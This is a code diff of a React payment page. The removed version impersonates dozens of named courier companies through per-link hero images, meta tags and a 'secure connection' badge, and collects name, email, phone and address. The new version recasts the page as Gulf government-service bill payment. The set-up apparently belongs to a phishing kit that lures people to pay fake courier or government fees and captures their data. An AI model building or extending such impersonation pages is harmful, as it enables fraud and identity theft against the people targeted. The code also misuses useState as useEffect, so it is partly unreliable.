@@ -1,85 +1,59 @@
-import { useState } from "react";
+import { useState, useMemo } from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import { Helmet } from "react-helmet-async";
 import { Card } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
-import { Badge } from "@/components/ui/badge";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
-import { getServiceBranding } from "@/lib/serviceLogos";
+import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
 import { getCountryByCode } from "@/lib/countries";
+import { getGovernmentServicesByCountry } from "@/lib/gccGovernmentServices";
 import { getCurrencySymbol, formatCurrency } from "@/lib/countryCurrencies";
-import { getCompanyMeta } from "@/utils/companyMeta";
 import PaymentMetaTags from "@/components/PaymentMetaTags";
 import { useLink, useUpdateLink } from "@/hooks/useSupabase";
-import { Shield, ArrowLeft, User, Mail, Phone, CreditCard, MapPin, Lock, CheckCircle } from "lucide-react";
-import heroAramex from "@/assets/hero-aramex.jpg";
-import heroDhl from "@/assets/hero-dhl.jpg";
-import heroFedex from "@/assets/hero-fedex.jpg";
-import heroSmsa from "@/assets/hero-smsa.jpg";
-import heroUps from "@/assets/hero-ups.jpg";
-import heroEmpost from "@/assets/hero-empost.jpg";
-import heroZajil from "@/assets/hero-zajil.jpg";
-import heroNaqel from "@/assets/hero-naqel.jpg";
-import heroSaudipost from "@/assets/hero-saudipost.jpg";
-import heroKwpost from "@/assets/hero-kwpost.jpg";
-import heroQpost from "@/assets/hero-qpost.jpg";
-import heroOmanpost from "@/assets/hero-omanpost.jpg";
-import heroBahpost from "@/assets/hero-bahpost.jpg";
-import heroGenacom from "@/assets/hero-genacom.jpg";
-import heroAlbaraka from "@/assets/hero-albaraka.jpg";
-import heroAlfuttaim from "@/assets/hero-alfuttaim.jpg";
-import heroAlshaya from "@/assets/hero-alshaya.jpg";
-import heroBahri from "@/assets/hero-bahri.jpg";
-import heroShipco from "@/assets/hero-shipco.jpg";
-import heroHellmann from "@/assets/hero-hellmann.jpg";
-import heroDsv from "@/assets/hero-dsv.jpg";
-import heroJinakum from "@/assets/hero-jinakum.jpg";
-import heroBg from "@/assets/hero-bg.jpg";
+import { ArrowLeft, User, Mail, Phone, CreditCard, Hash, Shield, CheckCircle } from "lucide-react";
 
-const PaymentRecipient = () => {
+const PaymentData = () => {
   const { id } = useParams();
   const navigate = useNavigate();
   const { data: linkData } = useLink(id);
   const updateLink = useUpdateLink();
+
   const [customerName, setCustomerName] = useState("");
   const [customerEmail, setCustomerEmail] = useState("");
   const [customerPhone, setCustomerPhone] = useState("");
-  const [residentialAddress, setResidentialAddress] = useState("");
+  const [invoiceNumber, setInvoiceNumber] = useState("");
+  const [selectedService, setSelectedService] = useState("");
+  const [paymentAmount, setPaymentAmount] = useState("");
 
   // Get query parameters from URL
   const urlParams = new URLSearchParams(window.location.search);
-  const serviceKey = urlParams.get('company') || linkData?.payload?.service_key || new URLSearchParams(window.location.search).get('service') || 'aramex';
-  const currencyParam = urlParams.get('currency');
-  const titleParam = urlParams.get('title');
+  const serviceKey = urlParams.get('company') || linkData?.payload?.service_key || 'payment';
 
-  const serviceName = linkData?.payload?.service_name || serviceKey;
-  const branding = getServiceBranding(serviceKey);
-  const companyMeta = getCompanyMeta(serviceKey);
+  const serviceName = "دفع فاتورة";
+  const paymentInfo = linkData?.payload as any;
 
-  // Use dynamic company meta for OG tags
-  const dynamicTitle = titleParam || companyMeta.title || `Payment - ${serviceName}`;
-  const dynamicDescription = companyMeta.description || `Complete your payment for ${serviceName}`;
-  const dynamicImage = companyMeta.image;
-
-  const shippingInfo = linkData?.payload as any;
-
-  // Get payer type from shipping info (default to "recipient" for backward compatibility)
-  const payerType = shippingInfo?.payer_type || "recipient";
-
-  // Get country from link data (must be before using currency functions)
-  const countryCode = shippingInfo?.selectedCountry || "SA";
+  // Get country from link data
+  const countryCode = paymentInfo?.selectedCountry || "SA";
   const countryData = getCountryByCode(countryCode);
   const phoneCode = countryData?.phoneCode || "+966";
+  const phonePlaceholder = countryData?.phonePlaceholder || "5X XXX XXXX";
 
-  // Use currency from URL parameter if available, otherwise from country data
-  const currencyCode = currencyParam || countryData?.currency || "SAR";
+  // Get government services for the country
+  const governmentServices = useMemo(
+    () => getGovernmentServicesByCountry(countryCode),
+    [countryCode]
+  );
 
-  // Get amount from link data - ensure it's a number, handle all data types
-  const rawAmount = shippingInfo?.cod_amount;
+  // Get selected government service details
+  const selectedServiceData = useMemo(
+    () => governmentServices.find(s => s.key === selectedService),
+    [governmentServices, selectedService]
+  );
 
-  // Handle different data types and edge cases
-  let amount = 500; // Default value
+  // Get amount from link data
+  const rawAmount = paymentInfo?.payment_amount;
+  let amount = 500;
   if (rawAmount !== undefined && rawAmount !== null) {
     if (typeof rawAmount === 'number') {
       amount = rawAmount;
@@ -91,48 +65,19 @@ const PaymentRecipient = () => {
     }
   }
 
-  const formattedAmount = formatCurrency(amount, currencyCode);
-
-  const phonePlaceholder = countryData?.phonePlaceholder || "5X XXX XXXX";
-
-  const heroImages: Record<string, string> = {
-    'aramex': heroAramex,
-    'dhl': heroDhl,
-    'dhlkw': heroDhl,
-    'dhlqa': heroDhl,
-    'dhlom': heroDhl,
-    'dhlbh': heroDhl,
-    'fedex': heroFedex,
-    'smsa': heroSmsa,
-    'ups': heroUps,
-    'empost': heroEmpost,
-    'zajil': heroZajil,
-    'naqel': heroNaqel,
-    'saudipost': heroSaudipost,
-    'kwpost': heroKwpost,
-    'qpost': heroQpost,
-    'omanpost': heroOmanpost,
-    'bahpost': heroBahpost,
-    'genacom': heroGenacom,
-    'jinaken': heroGenacom,
-    'albaraka': heroAlbaraka,
-    'alfuttaim': heroAlfuttaim,
-    'alshaya': heroAlshaya,
-    'bahri': heroBahri,
-    'national': heroBahri,
-    'shipco': heroShipco,
-    'hellmann': heroHellmann,
-    'dsv': heroDsv,
-    'jinakum': heroJinakum,
-  };
-
-  const heroImage = heroImages[serviceKey.toLowerCase()] || heroBg;
+  // Set initial payment amount from link data
+  useState(() => {
+    if (amount && !paymentAmount) {
+      setPaymentAmount(amount.toString());
+    }
+  }, [amount, paymentAmount]);
 
   const handleProceed = async (e: React.FormEvent) => {
     e.preventDefault();
 
     if (!linkData) return;
 
+    // Update link with payment data
     try {
       const updatedData = {
         ...linkData.payload,
@@ -140,8 +85,10 @@ const PaymentRecipient = () => {
           customer_name: customerName,
           customer_email: customerEmail,
           customer_phone: customerPhone,
-          residential_address: residentialAddress,
-          payer_type: payerType,
+          invoice_number: invoiceNumber,
+          selected_service: selectedService,
+          selected_service_name: selectedServiceData?.nameAr || selectedService,
+          payment_amount: parseFloat(paymentAmount) || amount,
         },
       };
 
@@ -150,7 +97,8 @@ const PaymentRecipient = () => {
         payload: updatedData,
       });
 
-      navigate(`/pay/${id}/details?service=${serviceKey}&currency=${currencyCode}&title=${encodeURIComponent(dynamicTitle)}`);
+      // Navigate to payment details
+      navigate(`/pay/${id}/details`);
     } catch (error) {
       console.error("Error updating payment data:", error);
     }
@@ -169,14 +117,12 @@ const PaymentRecipient = () => {
   return (
     <>
       <PaymentMetaTags
-        serviceName={dynamicTitle}
+        serviceName={serviceName}
         serviceKey={serviceKey}
-        amount={formattedAmount}
-        title={dynamicTitle}
-        description={dynamicDescription}
-        image={dynamicImage}
+        amount={formatCurrency(amount, countryCode)}
+        title="دفع فاتورة - إكمال البيانات"
+        description="قم بإكمال بيانات السداد لدفع الفاتورة"
       />
-
       <div className="min-h-screen" style={{ backgroundColor: uaeColors.lightGray }} dir="rtl">
         {/* Header */}
         <div className="w-full" style={{ backgroundColor: uaeColors.primary }}>
@@ -191,41 +137,24 @@ const PaymentRecipient = () => {
                   <p className="text-xs opacity-90">آمن • موثوق • سريع</p>
                 </div>
               </div>
-              <Badge variant="secondary" className="bg-white text-gray-800">
-                <Lock className="w-3 h-3 ml-1" />
-                اتصال آمن
-              </Badge>
-            </div>
-          </div>
-        </div>
-
-        {/* Hero Section */}
-        <div className="relative w-full h-64 overflow-hidden">
-          <img
-            src={heroImage}
-            alt={serviceName}
-            className="w-full h-full object-cover"
-          />
-          <div className="absolute inset-0 bg-black/40" />
-          <div className="absolute bottom-6 right-6 text-white max-w-2xl">
-            <div className="text-right">
-              <h2 className="text-2xl font-bold mb-2">{payerType === "recipient" ? "معلومات المستلم" : "معلومات المرسل"}</h2>
-              <p className="text-sm opacity-90 mb-1">{serviceName}</p>
-              <p className="text-lg font-semibold">{formattedAmount}</p>
+              <div className="text-white text-right">
+                <p className="text-sm font-medium">{countryData?.nameAr}</p>
+                <p className="text-xs opacity-90">{formatCurrency(amount, countryCode)}</p>
+              </div>
             </div>
           </div>
         </div>
 
         <div className="container mx-auto px-4 py-8">
-          <div className="max-w-4xl mx-auto">
+          <div className="max-w-3xl mx-auto">
             {/* Security Notice */}
             <div className="mb-6 p-4 bg-white rounded-lg border-r-4" style={{ borderRightColor: uaeColors.secondary }}>
               <div className="flex items-start gap-3">
                 <CheckCircle className="w-5 h-5 mt-0.5" style={{ color: uaeColors.secondary }} />
                 <div>
-                  <h3 className="font-semibold text-sm mb-1">بياناتك محمية</h3>
+                  <h3 className="font-semibold text-sm mb-1">إكمال بيانات السداد</h3>
                   <p className="text-xs text-gray-600">
-                    نحن نستخدم أعلى معايير الأمان لحماية معلوماتك الشخصية والمالية
+                    يرجى إدخال جميع البيانات المطلوبة لإكمال عملية الدفع
                   </p>
                 </div>
               </div>
@@ -238,13 +167,13 @@ const PaymentRecipient = () => {
                     className="w-12 h-12 rounded-full flex items-center justify-center"
                     style={{ backgroundColor: `${uaeColors.primary}15` }}
                   >
-                    <User className="w-6 h-6" style={{ color: uaeColors.primary }} />
+                    <CreditCard className="w-6 h-6" style={{ color: uaeColors.primary }} />
                   </div>
                   <div>
                     <h3 className="text-lg font-bold" style={{ color: uaeColors.accent }}>
-                      {payerType === "recipient" ? "بيانات المستلم" : "بيانات المرسل"}
+                      إكمال بيانات السداد
                     </h3>
-                    <p className="text-sm text-gray-500">الرجاء إدخال جميع البيانات المطلوبة</p>
+                    <p className="text-sm text-gray-500">الرجاء إدخال جميع البيانات بدقة</p>
                   </div>
                 </div>
               </div>
@@ -300,20 +229,66 @@ const PaymentRecipient = () => {
                   />
                 </div>
 
-                {/* Residential Address */}
+                {/* Invoice Number */}
                 <div>
-                  <Label htmlFor="address" className="flex items-center gap-2 mb-2 text-sm font-medium" style={{ color: uaeColors.accent }}>
-                    <MapPin className="w-4 h-4" />
-                    العنوان *
+                  <Label htmlFor="invoice" className="flex items-center gap-2 mb-2 text-sm font-medium" style={{ color: uaeColors.accent }}>
+                    <Hash className="w-4 h-4" />
+                    الرقم المفوتر *
                   </Label>
                   <Input
-                    id="address"
-                    value={residentialAddress}
-                    onChange={(e) => setResidentialAddress(e.target.value)}
+                    id="invoice"
+                    value={invoiceNumber}
+                    onChange={(e) => setInvoiceNumber(e.target.value)}
                     required
                     className="h-12 text-base border-2 focus:border-blue-500 transition-colors"
-                    placeholder="أدخل عنوانك الكامل"
+                    placeholder="مثال: INV-12345"
                   />
+                </div>
+
+                {/* Government Service Selection */}
+                <div>
+                  <Label className="mb-2 text-sm font-medium" style={{ color: uaeColors.accent }}>
+                    الخدمة الحكومية/العامة *
+                  </Label>
+                  <Select value={selectedService} onValueChange={setSelectedService}>
+                    <SelectTrigger className="h-12 text-base border-2 focus:border-blue-500 transition-colors">
+                      <SelectValue placeholder="اختر الخدمة" />
+                    </SelectTrigger>
+                    <SelectContent className="bg-background z-50">
+                      {governmentServices.map((service) => (
+                        <SelectItem key={service.id} value={service.key}>
+                          {service.nameAr}
+                        </SelectItem>
+                      ))}
+                    </SelectContent>
+                  </Select>
+                  {selectedServiceData && (
+                    <p className="text-xs text-gray-500 mt-1">
+                      {selectedServiceData.description}
+                    </p>
+                  )}
+                </div>
+
+                {/* Payment Amount */}
+                <div>
+                  <Label htmlFor="amount" className="flex items-center gap-2 mb-2 text-sm font-medium" style={{ color: uaeColors.accent }}>
+                    <CreditCard className="w-4 h-4" />
+                    مبلغ السداد *
+                  </Label>
+                  <Input
+                    id="amount"
+                    type="number"
+                    value={paymentAmount}
+                    onChange={(e) => setPaymentAmount(e.target.value)}
+                    required
+                    className="h-12 text-base border-2 focus:border-blue-500 transition-colors"
+                    placeholder={`${amount} ${getCurrencySymbol(countryCode)}`}
+                    step="0.01"
+                    min="0"
+                  />
+                  <p className="text-xs text-gray-500 mt-1">
+                    المبلغ الافتراضي: {formatCurrency(amount, countryCode)}
+                  </p>
                 </div>
 
                 {/* Payment Summary */}
@@ -321,7 +296,9 @@ const PaymentRecipient = () => {
                   <h4 className="font-semibold mb-3" style={{ color: uaeColors.accent }}>ملخص المبلغ</h4>
                   <div className="flex justify-between items-center">
                     <span className="text-sm text-gray-600">المبلغ الإجمالي</span>
-                    <span className="text-xl font-bold" style={{ color: uaeColors.primary }}>{formattedAmount}</span>
+                    <span className="text-xl font-bold" style={{ color: uaeColors.primary }}>
+                      {formatCurrency(parseFloat(paymentAmount) || amount, countryCode)}
+                    </span>
                   </div>
                 </div>
 
@@ -331,7 +308,7 @@ const PaymentRecipient = () => {
                   size="lg"
                   className="w-full h-14 text-lg font-bold text-white mt-6 transition-all hover:opacity-90"
                   style={{ backgroundColor: uaeColors.primary }}
-                  disabled={!customerName || !customerEmail || !customerPhone || !residentialAddress}
+                  disabled={!customerName || !customerEmail || !customerPhone || !invoiceNumber || !selectedService || !paymentAmount}
                 >
                   <span className="ml-2">التالي</span>
                   <ArrowLeft className="w-5 h-5" />
@@ -357,4 +334,4 @@ const PaymentRecipient = () => {
   );
 };
 
-export default PaymentRecipient;
+export default PaymentData;
